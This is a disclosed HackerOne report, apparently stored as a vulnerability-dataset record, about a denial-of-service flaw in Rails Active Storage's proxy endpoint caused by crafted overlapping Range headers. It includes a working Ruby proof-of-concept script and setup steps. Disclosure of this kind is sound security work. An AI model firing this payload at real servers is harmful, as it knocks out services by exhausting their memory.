{
  "reported_to": "Ruby on Rails",
  "reported_by": "ooooooo_q ",
  "title": "DoS with crafted \"Range\" header",
  "content": "\nI have crafted a request header for \"range\" against proxy url in Active Storage and confirmed that it will be a DoS.\nhttps://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb#L14\nCode 115 Bytes\n1  def show\n2    if request.headers[\"Range\"].present?\n3      send_blob_byte_range_data @blob, request.headers[\"Range\"]\nhttps://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/concerns/active_storage/streaming.rb#L14\nCode 144 Bytes\n1    def send_blob_byte_range_data(blob, range_header, disposition: nil)\n2      ranges = Rack::Utils.get_byte_ranges(range_header, blob.byte_size)\nThe Range object returned by Rack::Utils.get_byte_ranges will never exceed the file size, but there is no restriction on overlapping ranges.\nCode 274 Bytes\n1\u276f bundle exec rails c\n2Loading development environment (Rails 7.1.2)\n3irb(main):001> Rack::Utils.get_byte_ranges(\"bytes=20-40\", 200)\n4=> [20..40]\n5irb(main):002> Rack::Utils.get_byte_ranges(\"bytes=20-200,0-200,0-200,-200,-200,\", 200)\n6=> [20..199, 0..199, 0..199, 0..199, 0..199]\nPoC\nCode 271 Bytes\n1\u276f ruby -v\n2ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]\n3\n4\u276f rails new range_dos -G -M -C -A -J -T \n5=>  Rails 7.1.2, Rack 3.0.8\n6\n7\u276f cd range_dos\n8\n9\u276f bin/rails active_storage:install\n10\n11\u276f bin/rails generate model User avatar:attachment \n12\n13\u276f bin/rails db:migrate   \nconfig/routes.rb\nCode 114 Bytes\n1Rails.application.routes.draw do\n2  resources :users\n3  get \"up\" => \"rails/health#show\", as: :rails_health_check\n4end\napp/controllers/users_controller.rb\nCode 316 Bytes\n1class UsersController < ApplicationController\n2\n3  def new\n4    @user = User.new\n5  end\n6\n7  def create\n8    user = User.create!(user_params)\n9    redirect_to \"/users/#{user.id}\"\n10  end\n11\n12  def show\n13    @user = User.find(params[:id])\n14  end\n15\n16  private\n17    def user_params\n18      params.require(:user).permit(:avatar)\n19    end\n20end\napp/views/users/new.html.erb\nCode 151 Bytes\n1<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>\n2  <%= form.file_field :avatar %><br>\n3  <%= form.submit %>\n4<% end %>\napp/views/users/show.html.erb\nCode 99 Bytes\n1<% if @user.avatar.attached? %>\n2  <%= image_tag rails_storage_proxy_path(@user.avatar) %>\n3<% end %>\nstart server\nCode 99 Bytes\n1# Comment out `config.force_ssl = true` in production.rb\n2\u276f RAILS_ENV=production bundle exec rails s\nAfter uploading the file on the http://0.0.0.0:3000/users/new screen, copy the proxy url that appears on the screen.\nSends the request using a crafted header for the url.\nrange_request.rb\nCode 424 Bytes\n1require 'net/http'\n2\n3# set proxy url\n4url = URI.parse('http://0.0.0.0:3000/rails/active_storage/blobs/proxy/...')\n5\n6req = Net::HTTP::Get.new(url.path)\n7\n8# length = 8000 # Bad request\n9\n10length = (80 * 1024 - \"bytes=\".bytesize) /  \"-999999999,\".bytesize\n11puts length \n12\n13req[\"Range\"] = \"bytes=\" + \"-999999999,\" * length \n14\n15res = Net::HTTP.start(url.host, url.port) {|http|\n16  http.request(req)\n17}\n18\n19puts res.message\n20puts res.body.bytesize\nCode 54 Bytes\n1\u276f ruby range_request.rb\n27446\n3Partial Content\n4410058706\nIf the target file is about 50 KB, each request will increase memory usage by several hundred MB.\nIf the file is nearly 1 MB, more than 10 GB of memory was used on the server side.\nImpact\nWhen accessing the url of proxy, it is possible to put a load on the server's memory usage, etc., by repeatedly writing values in the Range request header. Even if the attacker stops the request midway through, the server continues to prepare data, making the attack more efficient.\nThe same problem exists with Rack::Files, but the problem is more serious with Active Stroage, which deals with files uploaded by users.\nAdditionally, when using nginx, the header length is limited to 8KB, which reduces the impact of the attack. 80KB is set in unicorn and puma.\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "None"
  ],
  "screenshots": {},
  "disclosed_date": 1719322140,
  "report_url": "https://hackerone.com/reports/2307813",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Set up a new Rails application with Active Storage and create a model with an attachment."
    ],
    [
      2,
      "Upload a file and note the proxy URL generated by Active Storage."
    ],
    [
      3,
      "Craft a malicious HTTP request with a 'Range' header containing overlapping or excessive byte ranges."
    ],
    [
      4,
      "Send the crafted request to the proxy URL to trigger high memory usage on the server."
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to cause a Denial of Service (DoS) by sending crafted HTTP requests with malicious 'Range' headers to Active Storage's proxy endpoint. This causes the server to process overlapping or excessive byte ranges, leading to high memory consumption.",
  "reason": "The vulnerability involves understanding how Active Storage processes byte ranges in HTTP requests and crafting a specific header to exploit this. While the attack is straightforward once the header format is known, discovering the exact header manipulation requires insight into the server's handling of range requests.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}